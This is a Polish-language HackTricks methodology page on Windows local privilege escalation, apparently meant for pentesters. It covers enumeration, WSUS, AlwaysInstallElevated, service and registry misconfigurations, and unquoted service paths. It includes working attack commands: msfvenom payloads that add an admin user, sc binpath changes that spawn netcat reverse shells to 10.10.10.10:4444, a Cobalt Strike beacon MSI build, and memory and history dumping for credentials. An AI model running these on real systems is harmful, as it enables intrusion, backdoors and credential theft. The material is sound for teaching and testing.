# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Najlepsze narzędzie do wyszukiwania Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Podstawy teoretyczne Windows

### Tokeny dostępu

**Jeśli nie wiesz, czym są Windows Access Tokens, przeczytaj następującą stronę przed kontynuowaniem:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Sprawdź następującą stronę, aby uzyskać więcej informacji o ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Poziomy integralności

**Jeśli nie wiesz, czym są poziomy integralności w Windows, powinieneś przeczytać następującą stronę przed kontynuowaniem:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Kontrole bezpieczeństwa Windows

Są różne elementy w Windows, które mogą Ci **uniemożliwić enumerację systemu**, uruchamianie plików wykonywalnych lub nawet **wykryć Twoje działania**. Powinieneś **przeczytać** następującą **stronę** i **wyenumerować** wszystkie te **mechanizmy obronne** przed rozpoczęciem enumeracji privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## Informacje o systemie

### Enumeracja informacji o wersji

Sprawdź, czy wersja Windows ma znane podatności (sprawdź także zastosowane poprawki).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Wersja Exploits

Ta [strona](https://msrc.microsoft.com/update-guide/vulnerability) jest przydatna do wyszukiwania szczegółowych informacji o lukach bezpieczeństwa Microsoft. Ta baza danych zawiera ponad 4 700 luk bezpieczeństwa, pokazując **massive attack surface**, które prezentuje środowisko Windows.

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ma wbudowanego watson)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repozytoria GitHub z exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Środowisko

Czy w env variables zapisano jakieś credential/Juicy info?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Historia
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Pliki transkrypcji

Możesz dowiedzieć się, jak to włączyć, korzystając z [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Szczegóły wykonania pipeline'ów PowerShell są rejestrowane — obejmują wykonywane polecenia, wywołania komend oraz fragmenty skryptów. Jednak pełne szczegóły wykonania oraz wyniki mogą nie zostać przechwycone.

Aby to włączyć, postępuj zgodnie z instrukcjami w sekcji "Transcript files" dokumentacji, wybierając **"Module Logging"** zamiast **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Aby wyświetlić ostatnie 15 zdarzeń z logów PowersShell, możesz wykonać:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Rejestrowany jest kompletny zapis aktywności i pełnej zawartości wykonania skryptu, co zapewnia dokumentowanie każdego bloku kodu podczas jego uruchamiania. Proces ten zachowuje wszechstronny ślad audytowy każdej czynności, przydatny do badań sądowych (forensics) i analizy złośliwego zachowania. Dokumentując całą aktywność w momencie wykonania, dostarcza szczegółowych informacji o przebiegu procesu.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Zdarzenia logowania dla Script Block można znaleźć w Windows Event Viewer pod ścieżką: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Aby wyświetlić ostatnie 20 zdarzeń, możesz użyć:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Ustawienia Internetu
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Dyski
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Można przejąć system, jeśli aktualizacje nie są pobierane za pomocą http**S**, lecz przez http.

Zaczynasz od sprawdzenia, czy sieć używa aktualizacji WSUS bez SSL, uruchamiając w cmd następujące polecenie:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Lub następujące w PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Jeśli otrzymasz odpowiedź taką jak jedna z poniższych:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
A jeśli `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` lub `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` jest równe `1`.

Wówczas, **jest to podatne na eksploatację.** Jeśli ostatni wpis rejestru jest równy 0, wpis WSUS zostanie zignorowany.

Aby wykorzystać tę podatność, można użyć narzędzi takich jak: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - to skrypty exploitów typu MiTM służące do wstrzykiwania 'fałszywych' aktualizacji w ruch WSUS bez SSL.

Przeczytaj badania tutaj:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
W zasadzie jest to wada, którą wykorzystuje ten błąd:

> Jeśli mamy możliwość zmodyfikowania lokalnego proxy użytkownika, a Windows Updates używa proxy skonfigurowanego w ustawieniach Internet Explorera, to mamy również możliwość uruchomienia lokalnie [PyWSUS](https://github.com/GoSecure/pywsus), by przechwycić własny ruch i uruchomić kod jako uprzywilejowany użytkownik na naszym hoście.
>
> Co więcej, ponieważ usługa WSUS używa ustawień bieżącego użytkownika, będzie też korzystać z jego magazynu certyfikatów. Jeśli wygenerujemy certyfikat samopodpisany dla hosta WSUS i dodamy go do magazynu certyfikatów bieżącego użytkownika, będziemy mogli przechwycić zarówno HTTP jak i HTTPS ruch WSUS. WSUS nie używa mechanizmów podobnych do HSTS do wdrożenia walidacji typu trust-on-first-use na certyfikacie. Jeśli przedstawiony certyfikat jest zaufany przez użytkownika i ma poprawny hostname, zostanie zaakceptowany przez usługę.

Można wykorzystać tę podatność za pomocą narzędzia [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (gdy zostanie udostępnione).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Wiele agentów klasy enterprise udostępnia interfejs IPC na localhost oraz uprzywilejowany kanał aktualizacji. Jeśli enrollment da się wymusić na serwer atakującego, a updater ufa złośliwemu root CA lub sprawdzenia podpisu są słabe, lokalny użytkownik może dostarczyć złośliwy MSI, który usługa SYSTEM zainstaluje. Zobacz uogólnioną technikę (opartą na łańcuchu Netskope stAgentSvc – CVE-2025-0309) tutaj:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

A **local privilege escalation** vulnerability exists in Windows **domain** environments under specific conditions. These conditions include environments where **LDAP signing is not enforced,** users possess self-rights allowing them to configure **Resource-Based Constrained Delegation (RBCD),** and the capability for users to create computers within the domain. It is important to note that these **requirements** are met using **default settings**.

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** these 2 registers are **enabled** (value is **0x1**), then users of any privilege can **install** (execute) `*.msi` files as NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Jeśli masz sesję meterpreter możesz zautomatyzować tę technikę używając modułu **`exploit/windows/local/always_install_elevated`**

### PowerUP

Użyj polecenia `Write-UserAddMSI` z power-up, aby utworzyć w bieżącym katalogu binarny plik MSI Windows do eskalacji uprawnień. Ten skrypt zapisuje prekompilowany instalator MSI, który wyświetla monit o dodanie użytkownika/grupy (więc będziesz potrzebować dostępu GUI):
```
Write-UserAddMSI
```
Wystarczy uruchomić utworzony plik binarny, aby eskalować uprawnienia.

### MSI Wrapper

Read this tutorial to learn how to create a MSI wrapper using this tools. Note that you can wrap a "**.bat**" file if you **just** want to **execute** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Wygeneruj** za pomocą Cobalt Strike lub Metasploit **new Windows EXE TCP payload** w `C:\privesc\beacon.exe`
- Otwórz **Visual Studio**, wybierz **Create a new project** i wpisz "installer" w polu wyszukiwania. Wybierz projekt **Setup Wizard** i kliknij **Next**.
- Nadaj projektowi nazwę, np. **AlwaysPrivesc**, użyj **`C:\privesc`** jako lokalizacji, zaznacz **place solution and project in the same directory**, i kliknij **Create**.
- Klikaj **Next** aż dojdziesz do kroku 3 z 4 (wybierz pliki do dołączenia). Kliknij **Add** i wybierz Beacon payload, który właśnie wygenerowałeś. Następnie kliknij **Finish**.
- Zaznacz projekt **AlwaysPrivesc** w **Solution Explorer** i w **Properties** zmień **TargetPlatform** z **x86** na **x64**.
- Są też inne właściwości, które możesz zmienić, np. **Author** i **Manufacturer**, co może sprawić, że zainstalowana aplikacja będzie wyglądać bardziej wiarygodnie.
- Kliknij prawym przyciskiem projektu i wybierz **View > Custom Actions**.
- Kliknij prawym przyciskiem **Install** i wybierz **Add Custom Action**.
- Kliknij dwukrotnie **Application Folder**, wybierz plik **beacon.exe** i kliknij **OK**. Zapewni to, że Beacon payload zostanie wykonany natychmiast po uruchomieniu instalatora.
- W **Custom Action Properties** ustaw **Run64Bit** na **True**.
- Na koniec **zbuduj** projekt.
- Jeśli pojawi się ostrzeżenie `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, upewnij się, że ustawisz platformę na x64.

### MSI Installation

Aby wykonać **instalację** złośliwego `.msi` pliku w **tle:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Aby wykorzystać tę podatność, możesz użyć: _exploit/windows/local/always_install_elevated_

## Antywirusy i detektory

### Ustawienia audytu

Te ustawienia decydują o tym, co jest **logowane**, więc należy na nie zwrócić uwagę.
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding — warto wiedzieć, dokąd są wysyłane logs
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** jest zaprojektowany do **zarządzania hasłami lokalnego Administratora**, zapewniając, że każde hasło jest **unikatowe, losowe i regularnie aktualizowane** na komputerach dołączonych do domeny. Hasła te są bezpiecznie przechowywane w Active Directory i mogą być dostępne tylko dla użytkowników, którym przyznano wystarczające uprawnienia przez ACLs, pozwalając im na podgląd haseł lokalnego Administratora, jeśli są do tego upoważnieni.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Jeśli jest aktywny, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**Więcej informacji o WDigest na tej stronie**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Począwszy od **Windows 8.1**, Microsoft wprowadził wzmocnioną ochronę dla Local Security Authority (LSA), aby **zablokować** próby nieufnych procesów **odczytu jego pamięci** lub wstrzyknięcia kodu, dodatkowo zabezpieczając system.\
[**Więcej informacji o LSA Protection tutaj**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** został wprowadzony w **Windows 10**. Jego celem jest zabezpieczenie credentials przechowywanych na urządzeniu przed zagrożeniami, takimi jak pass-the-hash attacks.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Poświadczenia w pamięci podręcznej

**Poświadczenia domenowe** są uwierzytelniane przez **Local Security Authority (LSA)** i wykorzystywane przez komponenty systemu operacyjnego. Gdy dane logowania użytkownika zostaną uwierzytelnione przez zarejestrowany pakiet zabezpieczeń, zazwyczaj tworzone są poświadczenia domenowe dla tego użytkownika.\
[**Więcej informacji o poświadczeniach w pamięci podręcznej**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Użytkownicy i grupy

### Wymień użytkowników i grupy

Powinieneś sprawdzić, czy którakolwiek z grup, do których należysz, ma interesujące uprawnienia.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Grupy uprzywilejowane

Jeśli **należysz do jakiejś grupy uprzywilejowanej, możesz być w stanie eskalować uprawnienia**. Dowiedz się o grupach uprzywilejowanych i o tym, jak je wykorzystać do eskalacji uprawnień tutaj:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Dowiedz się więcej** o tym, czym jest **token** na tej stronie: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Sprawdź następującą stronę, aby **dowiedzieć się o interesujących tokenach** i jak je wykorzystywać:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Zalogowani użytkownicy / Sesje
```bash
qwinsta
klist sessions
```
### Katalogi domowe
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Polityka haseł
```bash
net accounts
```
### Pobierz zawartość schowka
```bash
powershell -command "Get-Clipboard"
```
## Uruchomione procesy

### Uprawnienia plików i folderów

Przede wszystkim, podczas listowania procesów **sprawdź, czy w linii poleceń procesu nie znajdują się hasła**.\\
Sprawdź, czy możesz **nadpisać uruchomiony plik binarny** lub czy masz prawa zapisu do folderu z plikami binarnymi, aby wykorzystać ewentualne [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Zawsze sprawdzaj, czy nie działają [**electron/cef/chromium debuggers** — możesz je wykorzystać do eskalacji uprawnień](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Sprawdzanie uprawnień binarek procesów**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Sprawdzanie uprawnień katalogów zawierających binaria procesu (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Możesz utworzyć zrzut pamięci uruchomionego procesu za pomocą **procdump** z sysinternals. Usługi takie jak **FTP** mają **credentials in clear text in memory**, spróbuj zrzucić pamięć i odczytać credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Niezabezpieczone aplikacje GUI

**Aplikacje uruchomione jako SYSTEM mogą pozwolić użytkownikowi na uruchomienie CMD lub przeglądanie katalogów.**

Przykład: "Windows Help and Support" (Windows + F1), wyszukaj "command prompt", kliknij "Click to open Command Prompt"

## Usługi

Service Triggers pozwalają Windows uruchomić usługę, gdy wystąpią określone warunki (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh itp.). Nawet bez praw SERVICE_START często możesz uruchomić uprzywilejowane usługi, wyzwalając ich triggers. Zobacz techniki enumeracji i aktywacji tutaj:

-
{{#ref}}
service-triggers.md
{{#endref}}

Uzyskaj listę usług:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Uprawnienia

Możesz użyć **sc**, aby uzyskać informacje o usłudze
```bash
sc qc <service_name>
```
Zaleca się posiadanie binarki **accesschk** z _Sysinternals_, aby sprawdzić wymagany poziom uprawnień dla każdej usługi.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Zaleca się sprawdzić, czy "Authenticated Users" mogą modyfikować jakąkolwiek usługę:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Włącz usługę

Jeśli występuje ten błąd (na przykład przy SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Możesz ją włączyć, używając
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Weź pod uwagę, że usługa upnphost zależy od SSDPSRV, aby działać (dla XP SP1)**

**Innym obejściem** tego problemu jest uruchomienie:
```
sc.exe config usosvc start= auto
```
### **Modify service binary path**

W scenariuszu, w którym grupa "Authenticated users" posiada **SERVICE_ALL_ACCESS** dla usługi, możliwa jest modyfikacja wykonywalnego pliku binarnego usługi. Aby zmodyfikować i uruchomić **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Ponowne uruchomienie usługi
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Eskalację uprawnień można osiągnąć przez następujące uprawnienia:

- **SERVICE_CHANGE_CONFIG**: Umożliwia rekonfigurację pliku binarnego usługi.
- **WRITE_DAC**: Pozwala na rekonfigurację uprawnień, co prowadzi do możliwości zmiany konfiguracji usług.
- **WRITE_OWNER**: Umożliwia przejęcie własności i rekonfigurację uprawnień.
- **GENERIC_WRITE**: Dziedziczy możliwość zmiany konfiguracji usług.
- **GENERIC_ALL**: Również dziedziczy możliwość zmiany konfiguracji usług.

Do wykrywania i eksploatacji tej podatności można użyć _exploit/windows/local/service_permissions_.

### Słabe uprawnienia plików binarnych usług

**Sprawdź, czy możesz zmodyfikować plik binarny, który jest uruchamiany przez usługę** lub czy masz **uprawnienia do zapisu w folderze**, w którym znajduje się plik binarny ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Możesz uzyskać listę wszystkich plików binarnych uruchamianych przez usługę za pomocą **wmic** (nie w system32) i sprawdzić swoje uprawnienia przy użyciu **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Możesz także użyć **sc** i **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Uprawnienia do modyfikacji rejestru usług

Powinieneś sprawdzić, czy możesz modyfikować jakikolwiek rejestr usług.\
Możesz **sprawdzić** swoje **uprawnienia** nad rejestrem **usług** wykonując:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Należy sprawdzić, czy **Authenticated Users** lub **NT AUTHORITY\INTERACTIVE** posiadają uprawnienia `FullControl`. Jeśli tak, binarka uruchamiana przez usługę może zostać zmieniona.

Aby zmienić ścieżkę wykonywanej binarki:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory permissions

Jeśli masz to uprawnienie względem rejestru, oznacza to, że **możesz tworzyć podrejestry z tego rejestru**. W przypadku Windows services jest to **wystarczające, aby execute arbitrary code:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Jeśli ścieżka do pliku wykonywalnego nie jest ujęta w cudzysłowach, Windows spróbuje uruchomić każdy fragment ścieżki kończący się przed spacją.

Na przykład dla ścieżki _C:\Program Files\Some Folder\Service.exe_ Windows spróbuje uruchomić:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Wypisz wszystkie niecytowane ścieżki usług, z wyłączeniem tych należących do wbudowanych usług Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Możesz wykryć i wykorzystać** tę podatność przy użyciu metasploit: `exploit/windows/local/trusted\_service\_path` Możesz ręcznie utworzyć plik binarny usługi przy użyciu metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Akcje odzyskiwania

Windows pozwala użytkownikom określić akcje, które mają zostać wykonane w przypadku awarii usługi. Tę funkcję można skonfigurować tak, aby wskazywała na binary. Jeśli ten binary da się zastąpić, możliwe może być privilege escalation. Więcej szczegółów znajdziesz w the [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Aplikacje

### Zainstalowane aplikacje

Sprawdź **permissions of the binaries** (może uda ci się nadpisać któryś z nich i escalate privileges) oraz **folderów** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Uprawnienia zapisu

Sprawdź, czy możesz zmodyfikować jakiś plik konfiguracyjny, aby odczytać jakiś specjalny plik, lub czy możesz zmodyfikować jakiś plik binarny, który zostanie uruchomiony przez konto Administratora (schedtasks).

Jednym ze sposobów znalezienia słabych uprawnień folderów/plików w systemie jest wykonanie:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Uruchamianie przy starcie

**Sprawdź, czy możesz nadpisać jakiś rejestr lub plik binarny, który zostanie uruchomiony przez innego użytkownika.**\
**Przeczytaj** **następującą stronę**, aby dowiedzieć się więcej o interesujących **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
